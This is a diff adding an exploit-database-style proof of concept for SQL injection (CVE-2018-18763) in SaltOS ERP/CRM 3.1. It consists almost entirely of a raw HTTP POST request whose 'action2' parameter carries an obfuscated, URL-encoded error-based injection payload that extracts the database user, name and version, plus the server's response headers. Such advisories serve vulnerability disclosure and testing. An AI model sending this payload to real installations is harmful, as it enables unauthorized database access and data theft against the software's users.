@@ -1,0 +1,39 @@
+# Exploit Title: SaltOS Erp, Crm 3.1 r8126 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.saltos.org/
+# Software Link: https://excellmedia.dl.sourceforge.net/project/saltos/stable/SaltOS-3.1-8126.linux-i686.tgz
+# Version: 3.1 r0 / 3.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18763
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php
+# 
+POST /[PATH]/index.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 747
+Cookie: PHPSESSID=il9r6344ch0ned04kg1hpc7l45; lang=en_US; __lang__=1543322831; style=blue; __style__=1543322831; iconset=silk; __iconset__=1543322831
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+action=ajax&query=numbers&page=usuarios&action2=list%27%29%20%61%6e%44%20%28%53%45%4c%65%63%74%20%31%35%35%20%46%72%6f%4d%28%53%45%4c%45%43%54%20%43%4f%75%6e%74%28%2a%29%2c%43%4f%6e%63%61%54%28%63%6f%6e%43%41%54%28%30%78%32%30%33%61%32%30%2c%55%73%65%52%28%29%2c%44%61%74%41%42%41%53%45%28%29%2c%56%45%72%53%49%6f%4e%28%29%29%2c%30%78%37%65%2c%28%73%65%6c%65%43%54%20%28%65%6c%54%28%31%35%35%3d%31%35%35%2c%31%29%29%29%2c%30%78%34%39%36%38%37%33%36%31%36%65%32%30%35%33%36%35%36%65%36%33%36%31%36%65%2c%66%6c%6f%4f%52%28%52%41%6e%64%28%30%29%2a%32%29%29%78%20%66%72%4f%4d%20%49%4e%46%6f%72%6d%41%54%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%4c%75%67%49%4e%53%20%47%72%6f%55%50%20%42%59%20%78%29%61%29%20%41%6e%64%20%28%27%45%66%65%27%3d%27%45%66%65&id=0: undefined
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 00:12:53 GMT
+Server: Apache/2.4.4 (Win32) OpenSSL/0.9.8y PHP/5.4.16
+X-Powered-By: SaltOS v3.1 r8126
+Expires: -1
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: keep-alive, close
+Content-Type: text/html;charset=UTF-8
+Transfer-Encoding: chunked
